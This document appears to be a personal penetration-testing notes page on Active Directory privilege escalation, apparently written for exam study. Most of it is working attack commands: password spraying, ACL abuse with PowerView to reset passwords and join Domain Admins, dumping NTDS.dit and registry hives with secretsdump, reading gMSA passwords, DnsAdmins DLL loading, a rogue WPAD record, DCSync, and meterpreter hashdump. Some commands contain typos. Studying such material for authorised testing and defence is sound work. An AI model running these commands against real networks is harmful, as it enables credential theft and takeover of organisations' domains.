# Active Directory Privilege Escalation
For exploitation see [[AD-Exploitation-Hub]] or general theory and definitions [[Active-Directory-Defined]]. For commands cheatsheet [[Active-Directory-Commands]] or for enumeration see [[Active-Directory-Enumeration-Defined]]. [[Network-Protocols-Cheatsheet]] are used extensive, especially [[DNS-Defined]] in AD networks.

THIS VERY WORK IN PROGRESS! AND VERY EARLY THERE ARE BETTER ELSEWHERE

## Scripts

[ADAPE](https://github.com/hausec/ADAPE-Script)

## Tooling

#### Recon Tools

- **DNS**
For more about [[DNS-Defined]], for enumeration for DNS see both 
[[DNS-Active-Recon]] and [[DNS-Recon-Passive]].
- **SMB**
See [SMB tool](SMB-Recon-Cheatsheet.md) and [[RPCClient-Cheatsheet]]
You want to target the subnet and then as you laterally move through the network the Administrators and DCs. `crackmapexec smb $IP -u users.txt -p passes.txt`
- **LDAP**
[[LDAP-Recon]]

#### Box Enumeration
[[Active-Directory-Enumeration-Cheatsheet]] and [[Active-Directory-Enumeration-Defined]] 
[[Windows-Privilege-Escalation-Vectors]] maybe required! 

[Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) is a Github repose that contains ..*"
Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines."* 

#### AMSI Bypassing
[[AMSI-Exploitation]] and [[AMSI-Bypassing]]

#### Exploitation Tools
[[Impacket-Cheatsheet]]
[[Kerbrute-Cheatsheet]]
[[Crackmapexec-Cheatsheet]]
[[Rubeus-Cheatsheet]] 
[[Seatbelt-Helpsheet]]
[[Mimikatz-Cheatsheet]]
[[Kekeo-Cheatsheet]]

#### C2s
[[C2-Matrix]]
[[Empire]] - Empire and Starkiller


#### Powerview
PowerView *is a powershell tool to gain network situational awareness one Windows domains."* For a good concatenation of all the [[Powerview-Cheatsheet]] see follow the link. [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). Due to the [Active Direcorty module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)  are a restricted to DCs and some(times) Administrators. Get PowerView on the box, you need some help. Below are some the commands in the cheatsheet but scenarios included
```powershell
. .\PowerView.ps1				# import PowerView
Import-Module PowerView.ps1		# Use this it is better	
Get-NetDomain					# Like ADDomain but lists less information
Get-NetDomainController				# List all Domain Controller
Get-NetForest					# like AdForest
Get-NetDomainTrust				# like NetDomainTrust

# ACL Abuse
ForceChangePassword use Set-DomainUserPassword
AddMembers use Add-DomainGroupMember
GenericAll use Set-DomainUserPassword or Add-DomainGroupMember or a New-MachineAccount
GenericWrite use Set-DomainObject
WriteOwner use Set-DomainObject
WriteDACL use Add-DomainObjectACL
AllExtendedRights use Set-DomainUserPassword or Add-DomainGroupMember


Find-InterestingDomainShareFile
-CheckAccess
*password*
*sensitive*
*admin*
*login*
*secret*
*unattend*.xml
*vmdk
*creds*
*credential*
*.config
```

#### Bloodhound and Sharphound
Mapping out the Domain and its properties is key to mental digesting the interconnected system of systems, abstract and physical see: [[Bloodhound-Guide]].

- Mark users as owned helps with speed in recursive lookups and visual clutter 
- Unroll group Membership in Bloodhound


## Users and Groups
[[Active-Directory-Default-Security-Groups-Table]] - and [[Windows-Groups]] also contains addition pwnables possiblities.
```powershell
net user $user $password /add /domain
net group "$groupname" /add $user

# LAPs group can read passwords
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
# Password is in output or Kali lapsdumper

Get-ADGroupMember -Identity DnsAdmins
```

`whoami /all` check for [[SePrivilege-Token-Table]]:

#### Backup Operators

For [[SeBackupPrivilege]] can run `robocopy` against any file even when lack permissions - the The [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) of the builtin [[Windows-Groups]]  can login to the DC. Use `robocopy` to copy NTDSs.dit, system and SAM files exfiltrate out, `secretsdump` from [[Impacket-Cheatsheet]] or [DSInternals](https://github.com/MichaelGrafnetter/DSInternals, crack or [[Pass-The-Hash]] and elevate. Or you could copy the entire Hive. Or use [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) or copy the `C` drive and expose it as different drive letter as the shadow copy won't be in use. Some location can specifically denied even if we have `FILE_FLAG_BACKUP_SEMANTICS` of [[SeBackupPrivilege]] - see the previously referenced article for potential bypass 
```powershell
robocopy /b C:\Windows\NTDS\ntds.dit
robocopy /b C:\Windows\System32\config\SYSTEM
robocopy /b C:\Windows\System32\config\SECURITY
# Save the hives
reg save HKLM\SYSYEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
# Dump the hives and dit
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
# or with DSInternals
PS C:\> Import-Module .\DSInternals.psd1
PS C:\> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=adprivesc,DC=local' -DBPath .\ntds.dit -BootKey $key
```

#### Event Log Readers

[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) can read event logs from local computers, look in the logs for anything before erasing..
```powershell
# Searching security logs 
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Passing credentials with  wevtutil
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
# Requires administrative privileges to use the *-WinEvent commands
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
# To run as a specific user:
# -Credential 
```

#### DnsAdmins

1. Use [mimilibdll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) authored by Benjamin Delphy by  modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute code - review [labofapenetrationtester article](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

2. Create a WPAD Record - [[Responder-Cheatsheet]] or [[Inveigh-Cheatsheet]] to capture hashes as [DnsAdmins have permission to disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
```powershell
# Disable the global query block list
Get-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.$domain.local
# Create a malicious A record point to our machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName $domain.local -ComputerName dc01.$domain.local -IPv4Address $badIPv4address
```

3. User Dnscmd to load a plugin
[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) attack chain:
- *DNS management is performed over RPC*
- *[ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. *This can be done with the `dnscmd` tool from the command line*
- *When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated*
- *When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)*
- *An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.*

[[Creating-Malicious-DLLs]], Review [Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) - [How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
```powershell
# Warning stop and starting a DNS server is destructive and bad opsec
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# Get our SID
wmic useraccount where name="$compromisedUserThatRanDnscmd" get sid
# Check permissions on DNS service - beware SDDL
sc.exe sdshow DNS
# Stop and start DNS to load the plugin
sc stop dns
sc start dns
#
# Cleanup
#
# Confirm registry key added
reg query \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# Delete registry key
reg delete \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters/v ServerLevelPluginDll
```


ReadGMSAPassword
```powershell
$gmsa = Get-ADServiceAccount -Identity $username-of-target-account -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$convmp = ConvertFrom-ADManagedPasswordBlob $mp
$passwd = $convmp.'currentpassword'
# Some default groups have $ at the end! Also the $user variable is easier later steps
$user = '$username-of-target'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = Net-Object System-Managemt.automation.pscredential $user,$secpass
```

GenricAll Permission
```powershell
# $cred is the user with generic write
$user = '$username-with-generic-write'
$pass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
$cred = Net-Object System-Management.automation.pscredential $user,$pass
# Run a command on remote box, but we are using another users credentials
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-AdAccountPassword -Identity $targetuser -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force)} -Credential $cred 
```
Then Wmi remote in with [[Impacket-Cheatsheet]]
```bash
impacket-wmiexec.py '$domain/$user:$password@domain.local'
```

ForceChangePassword - Bloodhound and [[Powerview-Cheatsheet]]
```powershell
$newpass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
# Powerview command
Set-DomainUserPassword -Identity $target -AccountPassword $newPass
```

GenericWrite - [[Powerview-Cheatsheet]]
```powershell
# Without Bloodhound
Import-PowerView.ps1
Invoke-ACLScanner -ResolveGUIDs | ? {$_.identityreferncename -like '$target$'}
Set-DomainObjectOwner -identity 'Domain Admins' -OwnerIdentity $target
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity $target -Rights all
Add-DomainGroupMember -Idetnity  'Domain Admins' -Members $target
# Log off and on to affect change
```

Account Operators/Write DACL - [[AMSI-Exploitation]]
[[Powerview-Cheatsheet]], [[Evil-winrm-Cheatsheet]] and [[Impacket-Cheatsheet]] or  [[Crackmapexec-Cheatsheet]]
```powershell
# Account Operators can create and modify non-protected users and groups
# Find one - Non-Protect != Protected, but more privileged the better
net user $user $password /add /domain
net group "$Non-Protected-Group" $user /add
net localgroup "Remote Managment Users" $user /add # For Remoting
Bypass-4MSI # Evil-Winrm
# Dump creds with DC-SYNCing and secretsdumps
```
[[AD-DC-Sync-Attack]] 

GetChangesAll/Replication - PrivEsc with [[AD-DC-Sync-Attack]] with [[Impacket-Cheatsheet]]
```bash
secretsdump -just-dc $domain/$user@$DC-ip
# For just ntlms 
-just-dc-ntlm 
```



## Services

If SPN misconfigured Privileges using combinations of [[Active-Directory-Lateral-Movement]] and [[AD-Kerberos-Delegation-Exploitation]].
```powershell
setspn -T medin -Q  */*        # extract all accounts in the SPN - service principle name - service and account mapping
```


## Appendix

#### Metasploit and Proxychains

Metasploit combined with proxychains can used to pivot and access segmented sections of network.
The shells create route through then inaccessable parts of the network can be mapped beyond the shell's address.
To proxy through the network see sections on [[Proxies]] and [[Pivoting-and-Proxying-with-Metasploit]] 

Due to Trusts, pivoting in required to hop to the connection between Domains. 
Trust can be: 
1. Directional - The direction of the trusts flows from a trusting domain to a trusted domain.
1. Transitive - The trust relationship expands beyond just two domains to include other trusted domains.

If inclined meterpreter and its commands:
```meterpreter
migrate 	# Don't forget to migrate to better processes as processes die: lsass.exe
hashdump

use incognito
list_token -u
impersonate_token $TOKEN
```


## References

[10 AD PrivEsc Concepts You MUST Know for Mastering OSCP](https://www.youtube.com/watch?v=xowytiyooBk)
[Snovvcrahs ACL-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)
[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
[Active Direcorty module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)  